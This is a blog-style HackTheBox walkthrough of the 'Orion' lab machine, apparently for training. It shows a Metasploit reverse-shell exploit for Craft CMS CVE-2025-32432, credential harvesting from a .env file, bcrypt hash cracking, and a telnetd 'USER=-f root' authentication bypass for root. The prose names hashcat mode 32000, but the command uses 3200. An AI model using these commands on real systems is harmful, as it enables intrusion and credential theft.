---
slug: orion-hackthebox-detailed-walkthrough
title: Orion — HackTheBox Detailed Walkthrough
date: 2026-07-08
description: A detailed Orion HackTheBox walkthrough covering Craft CMS
  CVE-2025-32432, exposed database credentials, password cracking, and telnet
  privilege escalation.
tags:
  - HackTheBox
  - Cybersecurity
  - Penetration Testing
  - Walkthrough
  - Orion
cover: /assets/media/blog/orion-hackthebox-detailed-walkthrough/cover.png
coverAlt: Orion — HackTheBox
sourceUrl: https://medium.com/@bericontraster/orion-hackthebox-detailed-walkthrough-14c3d79de607
author: Beri Contraster
featured: true
draft: false
---

Today we will pwn [Orion](https://app.hackthebox.com/machines/Orion) from [HackTheBox](https://app.hackthebox.com). It’s an easy-difficulty Linux machine by [Pho3o](https://app.hackthebox.com/users/1829350).

## Machine Overview

**Orion** is an easy-difficulty Linux machine simulating a compromised web application and legacy communications environment. Initial entry leverages CVE-2025–32432, a remote code execution vulnerability in CraftCMS where a cross-site request forgery (CSRF) validation bypass allows an attacker to execute arbitrary code and establish a foothold under the web service account.

Post-exploitation reveals a misconfigured environment variable file containing exposed database credentials, allowing access to an underlying MySQL instance. A retrieved password hash is successfully cracked and exploited due to credential reuse on a local system account, granting direct SSH access.

Finally, privilege escalation to root is accomplished by abusing a vulnerable telnetd instance affected by CVE-2026-24061, where an authentication bypass flaw in the legacy daemon allows an attacker to completely circumvent authentication controls and spawn a root shell.

## Enumeration

### Nmap Scan

We’ll start with an nmap scan with script and version detection enabled.

```shell-session
$ nmap 10.129.18.167 -sCV -oN default-scan
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-07 10:02 +0500
Nmap scan report for 10.129.18.167 (10.129.18.167)
Host is up (0.26s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://orion.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.73 seconds
```

The above scan reveals a website running on port 80, which is being redirected to orion.htb. We’ll add the hostname IP to our /etc/hosts file for proper redirection.

```shell-session
echo "10.129.1.122 orion.htb" >> /etc/hosts
```

### Web Enumeration — 80

We’ll start by taking a look at the site and see if we find anything.

![landing page of orion telecom comapny](/assets/media/blog/orion-hackthebox-detailed-walkthrough/figure-1.png)
*Orion Telecom*

We see a website of a telecom company that seems to be working with large corporations and government agencies.

Using [Wappalyzer](https://www.wappalyzer.com/), we detected the tech stack being used by the site, and it revealed that the site is using Craft CMS with Yii frameworks.

![detected tech stack by wappalyzer firefox extension](/assets/media/blog/orion-hackthebox-detailed-walkthrough/figure-2.png)
*Craft CMS*

To enumerate further, we’ll start with fuzzing endpoints using ffuf.

```shell-session
$ ffuf -u http://orion.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -ic

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://orion.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

admin                   [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 2891ms]
assets                  [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 781ms]
```

The above output reveals an admin endpoint that redirects to /admin/login. It has a login portal with the Craft CMS version 5.6.16 displayed at the bottom.

![Orion administration login portal running craft cms 5.6.16](/assets/media/blog/orion-hackthebox-detailed-walkthrough/figure-3.png)
*Orion Telecom Login Portal*

## Exploiting Craft CMS — Initial Access CVE-2025–32432

A quick Google search against the enumerated Craft CMS version 5.6.16 revealed that it is vulnerable to remote code execution [CVE-2025–32432](https://nvd.nist.gov/vuln/detail/CVE-2025-32432).

> The core vulnerability within CVE-2025–32432 lies in the processing logic of Craft CMS’s actions/assets/generate-transform endpoint, which handles image transformations and requires a valid, unique asset ID that an unauthenticated attacker can discover via response enumeration. Traditional Cross-Site Request Forgery (CSRF) protections are bypassed by staging a malicious PHP payload inside a temporary session file during routine authentication redirections; when a request is then issued to the endpoint with a manipulated handle object, the framework deserializes the configuration without input validation, resulting in remote code execution. While legacy 3.x installations parse this malicious body with minimal friction, the exploitation path changes in Craft CMS 4.x and 5.x environments due to stricter structural validation implemented earlier in the request lifecycle. [Read More](https://sensepost.com/blog/2025/investigating-an-in-the-wild-campaign-using-rce-in-craftcms/)

There aren’t many reliable exploits available on GitHub for this vulnerability, so we’ll use the one from Rapid7.

```shell-session
$ msfconsole -q
msf > use linux/http/craftcms_preauth_rce_cve_2025_32432
msf exploit(linux/http/craftcms_preauth_rce_cve_2025_32432) > set rhost orion.htb
msf exploit(linux/http/craftcms_preauth_rce_cve_2025_32432) > set lhost tun0
```

Now that our parameters are set, we’ll go on and execute the exploit.

```shell-session
$ msf exploit(linux/http/craftcms_preauth_rce_cve_2025_32432) > exploit
[*] Started reverse TCP handler on 10.10.16.246:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] Leaked session.save_path: /var/lib/php/sessions
[+] The target is vulnerable. Session path leaked
[*] Injecting stub & triggering payload...
[*] Sending stage (45739 bytes) to 10.129.18.167
[*] Meterpreter session 1 opened (10.10.16.246:4444 -> 10.129.18.167:49914) at 2026-07-07 10:47:53 +0500

meterpreter > shell
Process 1683 created.
Channel 0 created.
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
script /dev/null -c /bin/bash
Script started, output log file is '/dev/null'.
www-data@orion:~/html/craft/web$
```

We can upgrade the reverse shell into a fully interactive TTY terminal via the following command.

```shell-session
script /dev/null -c /bin/bash
Script started, output log file is '/dev/null'.
www-data@orion:~/html/craft/web$
```

## Post Exploitation — User Flag

We’ll start by enumerating the Craft directory to see if we can stumble upon any stored passwords.

```shell-session
www-data@orion:~/html/craft$ cat .env

< ... snip ... >

# General settings
CRAFT_SECURITY_KEY=RRS86F6i2JQKdC6kfEI7frVxA47WVMx8
CRAFT_DEV_MODE=true
CRAFT_ALLOW_ADMIN_CHANGES=true
CRAFT_DISALLOW_ROBOTS=true
CRAFT_DB_DRIVER=mysql
CRAFT_DB_SERVER=127.0.0.1
CRAFT_DB_PORT=3306
CRAFT_DB_DATABASE=orion
CRAFT_DB_USER=root
CRAFT_DB_PASSWORD=SuperSecureCraft123Pass!
CRAFT_DB_SCHEMA=
CRAFT_DB_TABLE_PREFIX=

PRIMARY_SITE_URL=http://orion.htb/
```

We found a .env file under /var/www/html/craft/ directory with database credentials stored in plaintext.

Let’s use the discovered credentials to log in to MySQL.

```shell-session
www-data@orion:~/html/craft$ mysql -u root -p orion
Enter password: SuperSecureCraft123Pass!

Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 5988
Server version: 10.6.23-MariaDB-0ubuntu0.22.04.1 Ubuntu 22.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [orion]>
```

### Cracking Hash — Hashcat

While enumerating the table, I found the users table with the credentials of adam user.

```shell-session
MariaDB [orion]> select * from users;
select * from users;
+----+---------+------------------+--------+---------+--------+-----------+-------+----------+----------+-----------+----------+----------------+--------------------------------------------------------------+---------------------+--------------------+-------------------------+-------------------+----------------------+-------------+--------------+------------------+----------------------------+-----------------+-----------------------+------------------------+---------------------+---------------------+
| id | photoId | affiliatedSiteId | active | pending | locked | suspended | admin | username | fullName | firstName | lastName | email          | password                                                     | lastLoginDate       | lastLoginAttemptIp | invalidLoginWindowStart | invalidLoginCount | lastInvalidLoginDate | lockoutDate | hasDashboard | verificationCode | verificationCodeIssuedDate | unverifiedEmail | passwordResetRequired | lastPasswordChangeDate | dateCreated         | dateUpdated         |
+----+---------+------------------+--------+---------+--------+-----------+-------+----------+----------+-----------+----------+----------------+--------------------------------------------------------------+---------------------+--------------------+-------------------------+-------------------+----------------------+-------------+--------------+------------------+----------------------------+-----------------+-----------------------+------------------------+---------------------+---------------------+
|  1 |    NULL |             NULL |      1 |       0 |      0 |         0 |     1 | admin    | NULL     | NULL      | NULL     | adam@orion.htb | $2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS | 2026-03-12 11:25:04 | NULL               | NULL                    |              NULL | NULL                 | NULL        |            1 | NULL             | NULL                       | NULL            |                     0 | 2026-03-12 11:24:51    | 2026-03-06 11:24:45 | 2026-03-12 11:25:04 |
+----+---------+------------------+--------+---------+--------+-----------+-------+----------+----------+-----------+----------+----------------+--------------------------------------------------------------+---------------------+--------------------+-------------------------+-------------------+----------------------+-------------+--------------+------------------+----------------------------+-----------------+-----------------------+------------------------+---------------------+---------------------+
1 row in set (0.004 sec)
```

The hash is a bcrypt format, which can be cracked using hashcat with mode 32000.

```shell-session
$ hashcat '$2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS' /usr/share/wordlists/rockyou.txt -m 3200 --show
$2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS:darkangel
```

Now we can SSH as user Adam.

```shell-session
$ ssh adam@orion.htb                                                                                                                                 
adam@orion.htb's password: 
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-177-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

adam@orion:~$ id
uid=1000(adam) gid=1000(adam) groups=1000(adam)
```

Reading the user flag.

```shell-session
adam@orion:~$ cat user.txt
1c1a7b482####################
```

## Privilege Escalation — Root

While enumerating the system, I found a port 23/tcp which is not exposed externally. Port 23 is used by telnet. It is a legacy, unencrypted protocol used to provide command-line remote access to network devices and servers.

```shell-session
$ netstat -antp
```

![local telnet port 23 revealed in enumeration](/assets/media/blog/orion-hackthebox-detailed-walkthrough/figure-4.png)
*23/TCP*

### Exploiting Telnet CVE-2026–24061

The telnet version on the target system is 2.7 which is vulnerable to authentication bypasses, [CVE-2026–24061](https://nvd.nist.gov/vuln/detail/CVE-2026-24061).

> The core vulnerability within CVE-2026–24061 lies in an argument injection flaw residing in the GNU InetUtils telnetd service daemon. The issue stems from insufficient validation of client-supplied input during protocol negotiation via the NEW_ENVIRON option. Because the daemon forwards the user-controlled USER environment variable directly to the underlying /usr/bin/login binary without proper sanitization, an attacker can inject malicious flags such as -f root into the string template. The login binary interprets this injection as an explicit instruction to treat the session as pre-authenticated, completely bypassing standard password validation routines and immediately spawning an unauthenticated root shell.

```shell-session
adam@orion:~$ telnet --version
telnet (GNU inetutils) 2.7
Copyright (C) 2025 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <https://gnu.org/licenses/gpl.html>.
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.

Written by many authors.
```

We can use the following command to obtain a root shell.

```shell-session
adam@orion:~$ USER="-f root" telnet -a 127.0.0.1
Trying 127.0.0.1...
Connected to 127.0.0.1.
Escape character is '^]'.

Linux 5.15.0-177-generic (orion) (pts/2)

Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-177-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

< ... SNIP ... >

root@orion:~# id
uid=0(root) gid=0(root) groups=0(root)
```

Reading the root flag.

```shell-session
root@orion:~# cat root.txt
d64c603c5e####################
```

We are now root on [Orion](https://labs.hackthebox.com/achievement/machine/894352/945) from HackTheBox. This was a very fun box to solve. Thanks for reading.
